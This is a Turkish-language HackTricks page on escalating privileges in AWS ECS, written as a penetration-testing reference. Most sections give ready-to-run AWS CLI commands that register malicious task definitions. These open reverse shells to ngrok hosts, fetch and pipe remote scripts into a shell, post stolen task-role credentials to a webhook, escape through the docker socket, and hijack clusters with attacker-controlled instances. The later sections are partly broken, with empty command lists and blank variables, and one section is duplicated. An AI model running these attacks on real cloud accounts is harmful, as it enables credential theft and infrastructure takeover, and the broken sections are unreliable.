# AWS - ECS Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECS

ECS hakkında daha fazla **bilgi** için:

{{#ref}}
../../aws-services/aws-ecs-enum.md
{{#endref}}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

ECS'de `iam:PassRole`, `ecs:RegisterTaskDefinition` ve `ecs:RunTask` izinlerini kötüye kullanan bir saldırgan, metadata kimlik bilgilerini çalan **kötü amaçlı bir container** içeren **yeni bir task definition oluşturabilir** ve **bunu çalıştırabilir**.

{{#tabs }}
{{#tab name="Reverse Shell" }}
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
{{#endtab }}

{{#tab name="Webhook" }}

webhook.site gibi bir site kullanarak bir webhook oluşturun.
```bash

# Create file container-definition.json
[
{
"name": "exfil_creds",
"image": "python:latest",
"entryPoint": ["sh", "-c"],
"command": [
"CREDS=$(curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}); curl -X POST -H 'Content-Type: application/json' -d \"$CREDS\" https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890"
]
}
]

# Run task definition, uploading the .json file
aws ecs register-task-definition \
--family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 \
--memory 512 \
--requires-compatibilities FARGATE \
--container-definitions file://container-definition.json

# Check the webhook for a response

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1

```
{{#endtab }}

{{#endtabs }}

**Potential Impact:** Doğrudan farklı bir ECS role privesc.

### `iam:PassRole`,`ecs:RunTask`
`iam:PassRole` ve `ecs:RunTask` izinlerine sahip bir saldırgan, **execution role**, **task role** ve konteynerin **command** değerleri değiştirilmiş yeni bir ECS task'ı başlatabilir. `ecs run-task` CLI komutu `--overrides` bayrağına sahiptir; bu bayrak, task definition'a dokunmadan runtime'da `executionRoleArn`, `taskRoleArn` ve konteynerin `command` değerlerini değiştirmeye izin verir.

`taskRoleArn` ve `executionRoleArn` için belirtilen IAM rollerinin trust policy'sinde `ecs-tasks.amazonaws.com` tarafından assume edilmesine izin verilmelidir.

Ayrıca, saldırganın bilmesi gerekenler:
- ECS cluster adı
- VPC Subnet
- Security group (Eğer herhangi bir security group belirtilmezse varsayılan olan kullanılacaktır)
- Task Definition Name ve revision
- Container adı
```bash
aws ecs run-task \
--cluster <cluster-name> \
--launch-type FARGATE \
--network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" \
--task-definition <task-definition:revision> \
--overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": <container-name>,
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
Kod örneğinde saldırgan yalnızca `taskRoleArn` değerini değiştirir. Ancak saldırının gerçekleşebilmesi için saldırganın komutta belirtilen `taskRoleArn` ve task tanımında belirtilen `executionRoleArn` üzerinde `iam:PassRole` iznine sahip olması gerekir.

Eğer saldırganın pass edebildiği IAM rolü bir ECR görüntüsünü çekip ECS task'ı başlatmak için yeterli ayrıcalıklara sahipse (`ecr:BatchCheckLayerAvailability`, `ecr:GetDownloadUrlForLayer`,`ecr:BatchGetImage`,`ecr:GetAuthorizationToken`), saldırgan `ecs run-task` komutunda hem `executionRoleArn` hem de `taskRoleArn` için aynı IAM rolünü belirtebilir.
```sh
aws ecs run-task --cluster <cluster-name> --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" --task-definition <task-definition:revision> --overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"executionRoleArn":"arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": "<container-name>",
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
**Potansiyel Etki:** Herhangi bir ECS task role'e doğrudan privesc.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

Önceki örnekte olduğu gibi, ECS'deki **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** izinlerini kötüye kullanan bir saldırgan, metadata kimlik bilgilerini çalan bir **kötü amaçlı container** içeren **yeni bir task definition oluşturabilir** ve **çalıştırabilir**.\
Ancak bu durumda, kötü amaçlı task definition'ı çalıştırmak için bir container instance'a ihtiyaç vardır.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**Olası Etki:** Herhangi bir ECS rolüne doğrudan privesc.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)` 

Önceki örnekte olduğu gibi, ECS'te **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** veya **`ecs:CreateService`** izinlerini kötüye kullanan bir saldırgan, metadata kimlik bilgilerini çalan **kötü amaçlı bir container** içeren yeni bir **task definition** oluşturabilir ve en az 1 görev çalışacak şekilde yeni bir service oluşturarak bunu çalıştırabilir.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**Olası Etki:** Herhangi bir ECS rolüne doğrudan privesc.

### `iam:PassRole`, (`ecs:UpdateService|ecs:CreateService)`

Aslında, sadece bu izinlerle overrides kullanarak herhangi bir role sahip bir container içinde rastgele komutlar çalıştırmak mümkün:
```bash
aws ecs run-task \
--task-definition "<task-name>" \
--overrides '{"taskRoleArn":"<role-arn>", "containerOverrides":[{"name":"<container-name-in-task>","command":["/bin/bash","-c","curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:18499 | sh"]}]}' \
--cluster <cluster-name> \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"DISABLED\", \"subnets\":[\"<subnet-name>\"]}}"
```
**Potential Impact:** Herhangi bir ECS role doğrudan privesc.

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Bu senaryo önceki olanlara benziyor ancak **`iam:PassRole`** izni **olmaksızın**.\
Bu hâlâ ilginç çünkü role sahibi olmasa bile rastgele bir container çalıştırabiliyorsanız, node'a kaçmak için **run a privileged container to escape** yapabilir ve node'da çalışan **steal the EC2 IAM role** ve **other ECS containers roles**'u ele geçirebilirsiniz.\
Hatta ele geçirdiğiniz EC2 instance'ı içinde **force other tasks to run inside the EC2 instance** zorlayarak onların kimlik bilgilerini çalabilirsiniz (ayrıntılar için [**Privesc to node section**](aws-ecs-post-exploitation/README.md#privesc-to-node) bölümüne bakın).

> [!WARNING]
> Bu saldırı yalnızca **ECS cluster is using EC2** instances kullanılıyorsa ve Fargate kullanılmıyorsa mümkündür.
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Bir saldırgan, **`ecs:ExecuteCommand`, `ecs:DescribeTasks`** iznine sahip olduğunda, çalışan bir konteyner içinde **komutlar çalıştırabilir** ve ona bağlı IAM role'ü exfiltrate edebilir (`aws ecs execute-command`'ı çalıştırmak için describe permissions gereklidir).\
Ancak, bunu yapabilmek için konteyner örneğinin **ExecuteCommand agent**'ını çalıştırıyor olması gerekir (varsayılan olarak çalışmaz).

Bu nedenle, saldırgan şunları deneyebilir:

- **Her çalışan konteynerde bir komut çalıştırmayı denemek**
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
Container içinde bir shell elde ettiğinizde, genellikle task credentials endpoint'inden **task role credentials**'ı çıkarıp bunları container dışında yeniden kullanabilirsiniz:
```sh
# Inside the container:
echo "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" | jq

# If you want to use them locally, print shell exports:
python3 - <<'PY'
import json, os, urllib.request
u = "http://169.254.170.2" + os.environ["AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"]
d = json.load(urllib.request.urlopen(u, timeout=2))
print("export AWS_ACCESS_KEY_ID=" + d["AccessKeyId"])
print("export AWS_SECRET_ACCESS_KEY=" + d["SecretAccessKey"])
print("export AWS_SESSION_TOKEN=" + d["Token"])
PY
```
- Eğer kullanıcının **`ecs:RunTask`** izni varsa, `aws ecs run-task --enable-execute-command [...]` ile bir task çalıştırın
- Eğer kullanıcının **`ecs:StartTask`** izni varsa, `aws ecs start-task --enable-execute-command [...]` ile bir task çalıştırın
- Eğer kullanıcının **`ecs:CreateService`** izni varsa, `aws ecs create-service --enable-execute-command [...]` ile bir service oluşturun
- Eğer kullanıcının **`ecs:UpdateService`** izni varsa, `aws ecs update-service --enable-execute-command [...]` ile bir service güncelleyin

Bu seçeneklerin **örneklerini** **önceki ECS privesc bölümlerinde** bulabilirsiniz.

**Potential Impact:** Konteynerlere atanmış farklı bir role privesc yapılması.

### `ssm:StartSession`

**ssm privesc page** kısmında bu izni kullanarak **privesc to ECS** yapmanın nasıl kötüye kullanılabileceğini kontrol edin:

{{#ref}}
../aws-ssm-privesc/README.md
{{#endref}}

### `iam:PassRole`, `ec2:RunInstances`

**ec2 privesc page** kısmında bu izinleri kullanarak **privesc to ECS** yapmanın nasıl kötüye kullanılabileceğini kontrol edin:

{{#ref}}
../aws-ec2-privesc/README.md
{{#endref}}

### `ecs:RegisterContainerInstance`, `ecs:DeregisterContainerInstance`, `ecs:StartTask`, `iam:PassRole`

Bu izinlere sahip bir saldırgan sıklıkla **"cluster membership"i bir güvenlik sınırını atlatma yöntemine dönüştürebilir**:

- Bir **attacker-controlled EC2 instance** kaydederek hedef ECS cluster'a ekleyin (container instance haline gelir)
- Custom **container instance attributes** ayarlayarak **placement constraints**'ı karşılayın
- ECS'in görevleri o hosta planlamasına izin verin
- Hostunuzda çalışan task'tan **task role credentials** (ve container içindeki herhangi bir secret/veri) çalın

Yüksek seviye iş akışı:

1) Hedef hesapta kontrol ettiğiniz bir EC2 instance'tan EC2 instance identity document + signature elde edin (örneğin SSM/SSH üzerinden):
```bash
curl -s http://169.254.169.254/latest/dynamic/instance-identity/document > iidoc.json
curl -s http://169.254.169.254/latest/dynamic/instance-identity/signature > iisig
```
2) Onu hedef kümeye kaydedin; yerleştirme kısıtlamalarını karşılamak için isteğe bağlı olarak öznitelikler ayarlayın:
```bash
aws ecs register-container-instance \
--cluster "$CLUSTER" \
--instance-identity-document file://iidoc.json \
--instance-identity-document-signature "$(cat iisig)" \
--attributes name=labtarget,value=hijack
```
3) Katıldığını doğrulayın:
```bash
aws ecs list-container-instances --cluster "$CLUSTER"
```
4) Bir task başlatın / bir service güncelleyin, böylece bir şey instance üzerinde zamanlanır; ardından task içinden task role creds'i toplayın:
```bash
# On the container host:
docker ps
docker exec -it <container-id> sh
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```
Notlar:

- instance identity document/signature kullanarak bir container instance'ı kaydetmek, hedef hesaptaki bir EC2 instance'ına erişiminiz olduğunu (veya onu ele geçirdiğinizi) ima eder. Cross-account "bring your own EC2" için, bu sayfadaki **ECS Anywhere** tekniğine bakın.
- Yerleştirme kısıtlamaları genellikle container instance özniteliklerine dayanır. Hangi öznitelikleri ayarlamanız gerektiğini bilmek için `ecs:DescribeServices`, `ecs:DescribeTaskDefinition`, ve `ecs:DescribeContainerInstances` ile bunları listeleyin.


### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

> [!NOTE]
> TODO: Bunu test edin

Bir saldırgan, `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, ve `ecs:DescribeTaskSets` izinlerine sahipse, mevcut bir ECS service için **kötü amaçlı bir task set oluşturabilir ve primary task set'i güncelleyebilir**. Bu, saldırganın servisin içinde **keyfi kod çalıştırmasına** olanak tanır.
```bash
# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**Potential Impact**: Etkilenen serviste rastgele kod çalıştırma, bu servisin işlevselliğini etkileyebilir veya hassas verilerin sızdırılmasına yol açabilir.

## References

- [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)







### Kötü Amaçlı Capacity Provider (EC2 ASG takeover) ile ECS zamanlamasını ele geçirme

ECS capacity provider'ları yönetme ve servisleri güncelleme izinlerine sahip bir saldırgan, kendi kontrolündeki bir EC2 Auto Scaling Group oluşturabilir, bunu bir ECS Capacity Provider içine sarabilir, hedef cluster'a iliştirebilir ve mağdur servisi bu provider'ı kullanacak şekilde taşıyabilir. Görevler daha sonra saldırgan kontrolündeki EC2 örnekleri üzerine zamanlanacak; bu da konteynerları OS seviyesinde inceleme ve görev rolü kimlik bilgilerini çalma imkanı verir.

Commands (us-east-1):

- Prereqs



- Create Launch Template for ECS agent to join target cluster



- Create Auto Scaling Group



- Create Capacity Provider from the ASG



- Associate the Capacity Provider to the cluster (optionally as default)



- Migrate a service to your provider



- Verify tasks land on attacker instances



- Optional: From the EC2 node, docker exec into target containers and read http://169.254.170.2 to obtain the task role credentials.

- Cleanup



**Potential Impact:** Saldırgan kontrollü EC2 node'ları mağdur görevleri alır; bu, konteynerlara OS seviyesinde erişim ve görev IAM rolü kimlik bilgilerinin çalınmasını sağlar.


<details>
<summary>Step-by-step commands (copy/paste)</summary>
<pre>
export AWS_DEFAULT_REGION=us-east-1
CLUSTER=arn:aws:ecs:us-east-1:947247140022:cluster/ht-victim-cluster
# Instance profile for ECS nodes
aws iam create-role --role-name ht-ecs-instance-role --assume-role-policy-document Version:2012-10-17 || true
aws iam attach-role-policy --role-name ht-ecs-instance-role --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role || true
aws iam create-instance-profile --instance-profile-name ht-ecs-instance-profile || true
aws iam add-role-to-instance-profile --instance-profile-name ht-ecs-instance-profile --role-name ht-ecs-instance-role || true

VPC=vpc-18e6ac62
SUBNETS=

AMI=ami-0b570770164588ab4
USERDATA=IyEvYmluL2Jhc2gKZWNobyBFQ1NfQ0xVU1RFUj0gPj4gL2V0Yy9lY3MvZWNzLmNvbmZpZwo=
LT_ID=

ASG_ARN=

CP_NAME=htcp-8797
aws ecs create-capacity-provider --name  --auto-scaling-group-provider "autoScalingGroupArn=,managedScaling={status=ENABLED,targetCapacity=100},managedTerminationProtection=DISABLED"
aws ecs put-cluster-capacity-providers --cluster "" --capacity-providers  --default-capacity-provider-strategy capacityProvider=,weight=1

SVC=
# Task definition must be EC2-compatible (not Fargate-only)
aws ecs update-service --cluster "" --service "" --capacity-provider-strategy capacityProvider=,weight=1 --force-new-deployment

TASK=
CI=
aws ecs describe-container-instances --cluster "" --container-instances "" --query containerInstances[0].ec2InstanceId --output text
</pre>
</details>

### ECS Anywhere EXTERNAL kaydı yoluyla küme içinde compute'a arka kapı açma

ECS Anywhere'ı kötüye kullanarak, saldırganın kontrolündeki bir hostu mağdur ECS cluster'ında EXTERNAL container instance olarak kaydettirebilir ve bu hostta privileged task ve execution role'leri kullanarak görevler çalıştırabilirsiniz. Bu, görevlerin nerede çalıştırılacağı üzerinde (kendi makineniz) OS seviyesi kontrol sağlar ve task'lerden ve bağlı volume'lerden kimlik bilgisi/veri sızdırmaya olanak verir; capacity provider'lar veya ASG'lerle uğraşmaya gerek kalmaz.

- Required perms (example minimal):
- ecs:CreateCluster (optional), ecs:RegisterTaskDefinition, ecs:StartTask or ecs:RunTask
- ssm:CreateActivation, ssm:DeregisterManagedInstance, ssm:DeleteActivation
- iam:CreateRole, iam:AttachRolePolicy, iam:DeleteRole, iam:PassRole (for the ECS Anywhere instance role and task/execution roles)
- logs:CreateLogGroup/Stream, logs:PutLogEvents (if using awslogs)

- Impact: Run arbitrary containers with chosen taskRoleArn on attacker host; exfiltrate task-role credentials from 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI; access any volumes mounted by tasks; stealthier than manipulating capacity providers/ASGs.

Steps

1) Create/identify cluster (us-east-1)
```bash
aws ecs create-cluster --cluster-name ht-ecs-anywhere
```
2) ECS Anywhere rolü oluştur ve SSM aktivasyonu (on-prem/EXTERNAL instance için)
```bash
aws iam create-role --role-name ecsAnywhereRole \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ssm.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role
ACTJSON=$(aws ssm create-activation --iam-role ecsAnywhereRole)
ACT_ID=$(echo $ACTJSON | jq -r .ActivationId); ACT_CODE=$(echo $ACTJSON | jq -r .ActivationCode)
```
3) Saldırgan hostunu konuşlandır ve otomatik olarak EXTERNAL olarak kaydet (örnek: küçük AL2 EC2 “on‑prem”)

<details>
<summary>user-data.sh</summary>
```bash
#!/bin/bash
set -euxo pipefail
amazon-linux-extras enable docker || true
yum install -y docker curl jq
systemctl enable --now docker
curl -fsSL -o /root/ecs-anywhere-install.sh "https://amazon-ecs-agent.s3.amazonaws.com/ecs-anywhere-install-latest.sh"
chmod +x /root/ecs-anywhere-install.sh
/root/ecs-anywhere-install.sh --cluster ht-ecs-anywhere --activation-id ${ACT_ID} --activation-code ${ACT_CODE} --region us-east-1
```
</details>
```bash
AMI=$(aws ssm get-parameters --names /aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2 --query 'Parameters[0].Value' --output text)
IID=$(aws ec2 run-instances --image-id $AMI --instance-type t3.micro \
--user-data file://user-data.sh --query 'Instances[0].InstanceId' --output text)
aws ec2 wait instance-status-ok --instance-ids $IID
```
4) DIŞ container örneğinin katıldığını doğrulayın
```bash
aws ecs list-container-instances --cluster ht-ecs-anywhere
aws ecs describe-container-instances --cluster ht-ecs-anywhere \
--container-instances <ci-arn> --query 'containerInstances[0].[ec2InstanceId,attributes]'
# ec2InstanceId will be mi-XXXXXXXX (SSM managed instance id) and attributes include ecs.capability.external
```
5) task/execution rolleri oluşturun, EXTERNAL task definition'ı kaydedin ve bunu attacker host üzerinde çalıştırın
```bash
# roles
aws iam create-role --role-name ht-ecs-task-exec \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ht-ecs-task-exec --policy-arn arn:aws:iam::aws:policy/service-role/AmazonECSTaskExecutionRolePolicy
aws iam create-role --role-name ht-ecs-task-role \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
# attach any privileges you want to abuse to this task role

# task def (EXTERNAL launch)
cat > td-external.json << 'JSON'
{
"family": "ht-external",
"requiresCompatibilities": [ "EXTERNAL" ],
"networkMode": "bridge",
"memory": "256",
"cpu": "128",
"executionRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-exec",
"taskRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-role",
"containerDefinitions": [
{"name":"steal","image":"public.ecr.aws/amazonlinux/amazonlinux:latest",
"entryPoint":["/bin/sh","-c"],
"command":["REL=\$(printenv AWS_CONTAINER_CREDENTIALS_RELATIVE_URI); echo CREDS:; curl -s http://169.254.170.2\$REL; sleep 600"],
"memory": 128,
"logConfiguration":{"logDriver":"awslogs","options":{"awslogs-region":"us-east-1","awslogs-group":"/ht/ecs/anywhere","awslogs-stream-prefix":"steal"}}
}
]
}
JSON
aws logs create-log-group --log-group-name /ht/ecs/anywhere || true
aws ecs register-task-definition --cli-input-json file://td-external.json
CI=$(aws ecs list-container-instances --cluster ht-ecs-anywhere --query 'containerInstanceArns[0]' --output text)
aws ecs start-task --cluster ht-ecs-anywhere --task-definition ht-external \
--container-instances $CI
```
6) Buradan görevleri çalıştıran host'u kontrol edersiniz. Task loglarını okuyabilirsiniz (awslogs ise) veya doğrudan host'ta exec yaparak görevlerinizden kimlik bilgilerini/verileri dışarı çıkarabilirsiniz.

#### Komut örneği (placeholders)




### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

Bir saldırgan, ECS capacity provider'ları yönetme ve servisleri güncelleme izinlerine sahipse kendi kontrolünde bir EC2 Auto Scaling Group oluşturabilir, bunu bir ECS Capacity Provider içine sarıp hedef cluster'a ilişkilendirip mağdur servisi bu provider'ı kullanacak şekilde taşıyabilir. Görevler daha sonra saldırgan kontrolündeki EC2 instance'larına planlanacak; bu da container'ları OS düzeyinde inceleme ve task role kimlik bilgilerini çalma imkanı sağlar.

Commands (us-east-1):

- Önkoşullar



- Hedef cluster'a katılması için ECS agent içeren Launch Template oluşturun



- Auto Scaling Group oluşturun



- ASG'den Capacity Provider oluşturun



- Capacity Provider'ı cluster ile ilişkilendirin (isteğe bağlı olarak varsayılan yapın)



- Bir service'i sağlayıcınıza taşıyın



- Görevlerin saldırgan kontrollü instance'lara düştüğünü doğrulayın



- İsteğe bağlı: EC2 node'undan, hedef container'lara docker exec ile girin ve task role kimlik bilgilerini almak için http://169.254.170.2 adresini okuyun.

- Temizleme



**Olası Etki:** Saldırgan kontrollü EC2 node'ları mağdur görevleri alır; bu, container'lara OS düzeyinde erişim ve task IAM rolü kimlik bilgilerinin çalınmasını mümkün kılar.
{{#include ../../../../banners/hacktricks-training.md}}
